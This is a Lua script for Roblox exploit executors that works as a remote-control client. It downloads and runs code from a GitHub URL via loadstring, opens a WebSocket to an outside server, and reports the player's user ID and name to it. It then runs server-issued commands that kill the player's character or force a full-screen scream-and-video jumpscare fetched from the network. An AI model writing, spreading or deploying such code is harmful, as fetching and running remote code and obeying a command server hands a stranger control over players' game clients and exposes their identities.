-- Services / Variables
local connectionManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/EXT/main/connections.lua", true))().new("Id")
local localPlayer = game:GetService("Players").LocalPlayer
local httpService = game:GetService("HttpService")

-- WebSocket Client
local ws = WebSocket.connect("ws://testserver-diki.onrender.com")

-- Our connection data
local userdata = {
	action = "newuser",
	userid = localPlayer.UserId,
	username = localPlayer.Name,
}

local function sendCmdResponse(success, response)
	ws:Send(httpService:JSONEncode({
		action = "cmdresponse",
		success = success,
		response = response,
	}))
end

-- Commands
local commands = {
	kill = function(args)
		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")

		if humanoid and humanoid.Health > 0 then
			humanoid:TakeDamage(humanoid.MaxHealth)
			return sendCmdResponse(true, "Killed")
		end

		return sendCmdResponse(false, "Failed to kill")
	end,

	jumpscare = function(args)
		coroutine.wrap(function()
			if not writefile or not getcustomasset or not request then
				return sendCmdResponse(false, "Executor not supported")
			end

			writefile("scream.mp3", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/ScreamSfx.mp3", Method = "GET" }).Body)

			writefile("skibidi.webm", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/skibidi.webm", Method = "GET" }).Body)

			local items = {
				["_ScreenGui"] = Instance.new("ScreenGui"),
				["_VideoFrame"] = Instance.new("VideoFrame"),
			}

			items["_ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			items["_ScreenGui"].Parent = (gethui and gethui()) or game:GetService("CoreGui")

			items["_VideoFrame"].AnchorPoint = Vector2.new(0.5, 0.5)
			items["_VideoFrame"].Position = UDim2.new(0.5, 0, 0.5, 0)
			items["_VideoFrame"].Size = UDim2.new(1, 0, 1, 0)
			items["_VideoFrame"].ZIndex = 9999
			items["_VideoFrame"].Parent = items["_ScreenGui"]
			items["_VideoFrame"].Video = getcustomasset("skibidi.webm", true)

			local sound = Instance.new("Sound", workspace)
			sound.SoundId = getcustomasset("scream.mp3", true)
			sound:Play()

			items["_VideoFrame"].Looped = false
			items["_VideoFrame"]:Play()

			items["_VideoFrame"].Ended:Wait()

			items["_ScreenGui"]:Destroy()
			delfile("scream.mp3")
			delfile("skibidi.webm")

			return sendCmdResponse(true, "Success")
		end)()
	end,
}
-- Send user data so the server knows who we are
ws:Send(httpService:JSONEncode(userdata))

-- Listen for messages
connectionManager:NewConnection(ws.OnMessage, function(msg)
	local data = httpService:JSONDecode(msg)

	if data.action == "run" then
		local cmd = commands[data.cmd]
		if cmd then
			pcall(cmd, data.args)
		end
	end
end)

-- Listen for close
connectionManager:NewConnection(ws.OnClose, function()
	print("Closed")
end)
